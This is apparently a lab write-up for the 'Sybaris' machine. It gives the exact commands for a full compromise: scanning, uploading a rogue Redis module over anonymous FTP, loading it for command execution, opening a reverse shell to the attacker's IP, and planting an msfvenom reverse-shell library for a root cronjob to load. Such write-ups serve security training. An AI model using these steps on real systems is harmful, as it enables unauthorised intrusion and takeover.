Sybaris

Target IP: 192.168.172.93
Challenge Description: N/A.

Reconnaissance


Running a TCP port scan using the command sudo nmap -sS 192.168.172.93 -p- returns the result shown in the image above. There are four TCP ports open on the target machine. They are port 21, 22, 80, and 6379.

Running an aggressive TCP port scan using the command sudo nmap -sV -A 192.168.172.93 -p 21,22,80,6379 returns the output shown above. The target machine is running interesting applications. On port 21, it is running vsftpd 3.0.2 as the FTP. As stated from the scan, we can login as the user ftp where we have WRITE access inside the pub directory. This means I can upload files inside this directory. On port 22, the target machine is running OpenSSH 7.4. On port 80, the target machine is running Apache httpd 2.4.6 and serving some sort of web application. From the scan above, the web application title is Sybaris - Just another HTMLy blog which is using HTMLy v2.7.5. And finally on port 6379, the target machine is running Redis key-value store 5.0.9. This is an in-memory database application that uses key-value.

Enumeration

Port 80: HTTP

The webpage shown in the picture above is returned for this web application. At the footer section, I notice the unusual string Pablo. Is this a username? I did some source-code digging, but I didn't find anything useful. Since the application version is HTMLy v2.7.5. I did some research on vulnerabilities and came across this vulnerability. This vulnerability relies on Administrator privileges and can be used to delete any files in the directory.


I did some further directory search using the command feroxbuster -u http://192.168.172.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,jpg,yml,cfg -d 6 --scan-dir-listings -C 404. While the directory search was running, I decided to check out the result such as /login.


I browsed to the http://192.168.172.93/login and the webpage above was returned to me. Testing the different usernames, I identified the username pablo is a valid one. I tried different credentials such as pablo:admin, pablo:pablo, etc., but I had no luck. Maybe I can attempt to bruteforce the password of this user? I checked the different results from the directory search, but I didn't find anything useful. Time to check the Redis application.

Port 6379: Redis 5.0.9

Using redis-cli tool, I connected to the target machine as shown above. I connected to the target machine application by running the command redis-cli -h 192.168.172.93. Running the command info shows the application information such as version. The most popular exploit for this application is the Redis RCE, which can be obtained from here. Another method of achieving Remote Command Execution (RCE) is by abusing the load module feature, as shown here. From previous enumeration, the nmap mentioned it is possible to write to the pub directory using ftp. If I can load a malicious module, I can achieve RCE.

Exploitation

Owning the Redis via LOAD MODULE

Firstly, I cloned this GitHub project. When I tried to run make, I kept on getting errors. In the past, I have used the exp.so file to achieve command execution. This can be found in redis-rogue-server exploit. This exploit is available here. I downloaded this exp.so file on my machine.


To setup the exploit, I must use the FTP to upload my malicious module as I have WRITE privileges over the /var/ftp/pub directory. I connected to the target machine's FTP application using the command ftp 192.168.172.93 and the password as blank. Then I ran the command put exp.so to upload the malicious module at pub, a.k.a. /var/ftp/pub, successfully.


Then using the redis-cli session, I loaded the malicious module by running the command module load /var/ftp/pub/exp.so. This loaded successfully. And running the command system.exec "id" output "uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\n". Now I have achieved RCE on the target machine. Time to obtain a reverse shell connection.


After some trial and error, I noticed I had to use the same port 6379 otherwise the application would hang. I started a listener on my machine at port 6379, as shown in the picture above on the bottom terminal. Then using redis-cli session after loading the malicious module, I ran the command system.rev 192.168.45.206 6379 to invoke a reverse shell connection to my machine at port 6379 as shown in the picture above on the top terminal. And I obtained the reverse shell connection with the session as pablo as shown in the picture above on the bottom terminal. Then I made my exploit session stable by switching to a TTY using the command python -c 'import pty; pty.spawn("/bin/bash")'.

Privilege Escalation

Vertical Privilege Escalation: User pablo to User root via Shared Object Hijacking Inside log-sweeper Cronjob

After obtaining a shell, I ran the command ps -auxw. I notice there is an active cronjob. To double-check, I ran the command cat /etc/crontab and received the output shown in the image above. The binary /usr/bin/log-sweeper is being executed as root. Time to enumerate this further.


Running the command strings /usr/bin/log-sweeper returns the result shown in the image above. Right away, I notice the shared object by the name utils.so. Maybe I can perform Shared Object Hijacking. However, the path of the file is not specified.


To investigate the binary further, I ran the command ldd /usr/bin/log-sweeper. And bingo. It mentions utils.so => not found. Even executing the binary using the command /usr/bin/log-sweeper --help returns the error message error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory. When I ran the command cat /etc/crontab, I also obtained the following LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils.


To check if I have the write privileges of each path specified in the LD_LIBRARY_PATH, I ran the command ls -la <path>. Running the command ls -la /usr/local/lib/dev shows this user pablo has write privileges at /usr/local/lib/dev. I even created a file using the command touch gg as a PoC. This is where I will place my utils.so file to perform the Shared Object Hijacking Privilege Escalation. I tried to perform privilege escalation by creating a malicious C file. When compiling it on the target machine, I kept getting the error gcc: error trying to exec 'cc1':. Instead, I decided to use the msfvenom to generate the malicious shared object file.


To generate the malicious file, I ran the command msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=21 -f elf-so > utils.so. This will invoke a reverse shell connection to my machine at port 21.


Then using the FTP application, I uploaded this shared object file over at /var/ftp/pub.


Afterwards, I ran the command cp /var/ftp/pub/utils.so . to copy the utils.so at /usr/local/lib/dev. The file needs to be executable so the command chmod +x utils.so was used. I started a listener on my machine at port 21.


And after a while, I obtained a reverse shell connection on port 21 from the target machine. Now I have a root shell on the target machine :)
